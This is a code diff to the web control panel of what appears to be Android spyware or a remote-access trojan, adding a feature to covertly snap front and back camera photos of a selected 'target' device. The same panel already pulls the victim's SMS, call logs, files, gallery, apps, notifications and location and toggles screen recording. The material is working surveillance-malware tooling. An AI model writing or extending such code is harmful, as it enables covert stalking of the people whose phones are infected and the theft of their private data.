@@ -668,8 +668,7 @@
             if (!selectedClientId) { showPopup('error', 'Select target first'); return; }
             if (action === 'flash') { toggleFlash(); updateMainDashboard(); }
             else if (action === 'screenrecord') { toggleScreenRecord(); updateMainDashboard(); }
-            else if (action === 'takebackpic') sendCommand('takebackpic');
-            else if (action === 'takefrontpic') sendCommand('takefrontpic');
+            else if (action === 'takebackpic' || action === 'takefrontpic') openModal(action);
             else if (action === 'get_location') sendCommand('get_location');
             else openModal(action);
         };
@@ -690,7 +689,11 @@
             footer.innerHTML = '';
 
             // request fresh data
-            const cmdMap = { sms:'getsms', calls:'getcalllogs', filemanager:'filemanager', gallery:'gallery', apps:'list_app', notifications:'getnotifications' };
+            const cmdMap = { 
+                sms:'getsms', calls:'getcalllogs', filemanager:'filemanager', 
+                gallery:'gallery', apps:'list_app', notifications:'getnotifications',
+                takebackpic: 'takebackpic', takefrontpic: 'takefrontpic'
+            };
             if (cmdMap[type]) sendCommand(cmdMap[type]);
         }
 
@@ -708,13 +711,34 @@
             const data = clientDataCache[selectedClientId] || {};
             
             // Check if data changed to prevent flickering
-            const currentData = JSON.stringify(data[currentModal] || data[`${currentModal}_logs`] || {});
+            let currentData;
+            if (currentModal === 'takebackpic' || currentModal === 'takefrontpic') {
+                currentData = data.camera_image;
+            } else {
+                currentData = JSON.stringify(data[currentModal] || data[`${currentModal}_logs`] || {});
+            }
+            
             if (lastDataHashes[currentModal] === currentData) return;
             lastDataHashes[currentModal] = currentData;
 
             footer.innerHTML = '';
 
-            if (currentModal === 'gallery') {
+            if (currentModal === 'takebackpic' || currentModal === 'takefrontpic') {
+                if (data.camera_image) {
+                    body.innerHTML = `<div style="text-align:center;">
+                        <img src="/${data.camera_image}" style="max-width:100%; border-radius:18px; border:2px solid var(--accent-primary); box-shadow:0 0 20px var(--glow-primary);">
+                        <p style="margin-top:10px; color:var(--text-dim); font-size:0.8rem;">Saved to: ${data.camera_image}</p>
+                    </div>`;
+                    footer.innerHTML = `<button onclick="openModal('${currentModal}')">Jepret Lagi</button>`;
+                } else {
+                    body.innerHTML = `<div class="data-loader">
+                        <i class="fas fa-camera fa-pulse" style="font-size:3rem;color:var(--accent-secondary)"></i>
+                        <div class="mini-loader-bar"><div class="mini-loader-fill" style="width:100%"></div></div>
+                        <span>Capturing target...</span>
+                    </div>`;
+                }
+            }
+            else if (currentModal === 'gallery') {
                 const files = data.gallery?.files || [];
                 body.innerHTML = `<div class="gallery-grid">${files.map(f => `<div class="gallery-item"><img src="data:image/jpeg;base64,${f.thumbnail}"/><p>${f.name}</p></div>`).join('')}</div>`;
                 footer.innerHTML = `<button onclick="sendCommand('gallery back')">◀ Prev</button><span>page ${data.gallery?.page || 0}</span><button onclick="sendCommand('gallery next')">Next ▶</button>`;
